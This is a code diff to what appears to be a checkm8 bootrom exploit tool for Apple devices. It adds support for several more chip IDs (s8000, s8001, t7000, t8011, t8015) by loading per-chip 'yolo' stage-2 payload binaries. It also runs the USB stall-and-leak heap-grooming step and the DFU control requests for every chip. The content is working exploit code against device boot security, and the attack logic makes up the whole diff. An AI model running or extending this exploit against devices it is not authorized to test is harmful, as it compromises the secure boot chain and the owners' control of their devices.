@@ -84,14 +84,19 @@ typedef struct {
 	uint32_t sz;
 } transfer_ret_t;
 
-extern uint8_t payloads_yolo_s8003_bin[], payloads_yolo_t8010_bin[];
-extern unsigned payloads_yolo_s8003_bin_len, payloads_yolo_t8010_bin_len;
+extern uint8_t payloads_yolo_s8000_bin[], payloads_yolo_s8001_bin[], payloads_yolo_s8003_bin[], payloads_yolo_t7000_bin[], payloads_yolo_t8010_bin[],  payloads_yolo_t8011_bin[], payloads_yolo_t8015_bin[];
+extern unsigned payloads_yolo_s8000_bin_len, payloads_yolo_s8001_bin_len, payloads_yolo_s8003_bin_len, payloads_yolo_t7000_bin_len, payloads_yolo_t8010_bin_len, payloads_yolo_t8011_bin_len, payloads_yolo_t8015_bin_len;
 
 extern uint8_t payloads_Pongo_bin[], payloads_shellcode_bin[];
 extern unsigned payloads_Pongo_bin_len, payloads_shellcode_bin_len;
 
+#include <payloads/yolo_s8000.bin.h>
+#include <payloads/yolo_s8001.bin.h>
 #include <payloads/yolo_s8003.bin.h>
+#include <payloads/yolo_t7000.bin.h>
 #include <payloads/yolo_t8010.bin.h>
+#include <payloads/yolo_t8011.bin.h>
+#include <payloads/yolo_t8015.bin.h>
 
 #include <payloads/Pongo.bin.h>
 #include <payloads/shellcode.bin.h>
@@ -859,6 +864,20 @@ checkm8_stage_patch(const usb_handle_t *handle) {
 	uint64_t* p = (uint64_t*)blank;
     p[5] = insecure_memory_base;
 	switch (cpid) {
+		case 0x8000:
+			LOG_DEBUG("setting up stage 2 for s8000");
+			data = calloc(1, payloads_yolo_s8000_bin_len);
+			data_sz = 0;
+			memcpy(data, payloads_yolo_s8000_bin, payloads_yolo_s8000_bin_len);
+			data_sz += payloads_yolo_s8000_bin_len;
+			break;
+		case 0x8001:
+			LOG_DEBUG("setting up stage 2 for s8001");
+			data = calloc(1, payloads_yolo_s8001_bin_len);
+			data_sz = 0;
+			memcpy(data, payloads_yolo_s8001_bin, payloads_yolo_s8001_bin_len);
+			data_sz += payloads_yolo_s8001_bin_len;
+			break;
 		case 0x8003:
 			LOG_DEBUG("setting up stage 2 for s8003");
 			data = calloc(1, payloads_yolo_s8003_bin_len);
@@ -866,22 +885,43 @@ checkm8_stage_patch(const usb_handle_t *handle) {
 			memcpy(data, payloads_yolo_s8003_bin, payloads_yolo_s8003_bin_len);
 			data_sz += payloads_yolo_s8003_bin_len;
 			break;
+		case 0x7000:
+			LOG_DEBUG("setting up stage 2 for t7000");
+			data = calloc(1, payloads_yolo_t7000_bin_len);
+			data_sz = 0;
+			memcpy(data, payloads_yolo_t7000_bin, payloads_yolo_t7000_bin_len);
+			data_sz += payloads_yolo_t7000_bin_len;
+			break;
 		case 0x8010:
 			LOG_DEBUG("setting up stage 2 for t8010");
 			data = calloc(1, payloads_yolo_t8010_bin_len);
 			data_sz = 0;
 			memcpy(data, payloads_yolo_t8010_bin, payloads_yolo_t8010_bin_len);
 			data_sz += payloads_yolo_t8010_bin_len;
-			if(checkm8_usb_request_stall(handle) && checkm8_usb_request_leak(handle)) {
-				LOG_DEBUG("successfully leaked data");
-			} else {
-				LOG_ERROR("failed to leak data");
-				return false;
-			}
+			break;
+		case 0x8011:
+			LOG_DEBUG("setting up stage 2 for t8011");
+			data = calloc(1, payloads_yolo_t8011_bin_len);
+			data_sz = 0;
+			memcpy(data, payloads_yolo_t8011_bin, payloads_yolo_t8011_bin_len);
+			data_sz += payloads_yolo_t8011_bin_len;
+			break;
+		case 0x8015:
+			LOG_DEBUG("setting up stage 2 for t8015");
+			data = calloc(1, payloads_yolo_t8015_bin_len);
+			data_sz = 0;
+			memcpy(data, payloads_yolo_t8015_bin, payloads_yolo_t8015_bin_len);
+			data_sz += payloads_yolo_t8015_bin_len;
 			break;
 		default:
 			LOG_ERROR("unsupported cpid 0x%" PRIX32 "", cpid);
 			return false;
+	}
+	if(checkm8_usb_request_stall(handle) && checkm8_usb_request_leak(handle)) {
+		LOG_DEBUG("successfully leaked data");
+	} else {
+		LOG_ERROR("failed to leak data");
+		return false;
 	}
 	for(i = 0; i < 2; i++) {
 		LOG_DEBUG("i = %zu", i);
@@ -893,15 +933,7 @@ checkm8_stage_patch(const usb_handle_t *handle) {
 			packet_sz = MIN(data_sz - i, DFU_MAX_TRANSFER_SZ);
 			ret = send_usb_control_request(handle, 0x21, DFU_DNLOAD, 0, 0, &data[i], packet_sz, NULL);
 		}
-		if (cpid == 0x8003) {
-			send_usb_control_request_no_data(handle, 0x21, 4, 0, 0, 0, NULL);
-		} else if (cpid == 0x8010) {
-			send_usb_control_request_no_data(handle, 0x21, DFU_DNLOAD, 0, 0, DFU_FILE_SUFFIX_LEN, NULL);
-			send_usb_control_request_no_data(handle, 0x21, DFU_DNLOAD, 0, 0, 0, NULL);
-			dfu_check_status(handle, DFU_STATUS_OK, DFU_STATE_MANIFEST_SYNC);
-			dfu_check_status(handle, DFU_STATUS_OK, DFU_STATE_MANIFEST);
-			dfu_check_status(handle, DFU_STATUS_OK, DFU_STATE_MANIFEST_WAIT_RESET);
-		}
+		send_usb_control_request_no_data(handle, 0x21, 4, 0, 0, 0, NULL);
 	}
 	free(data);
 	return ret;
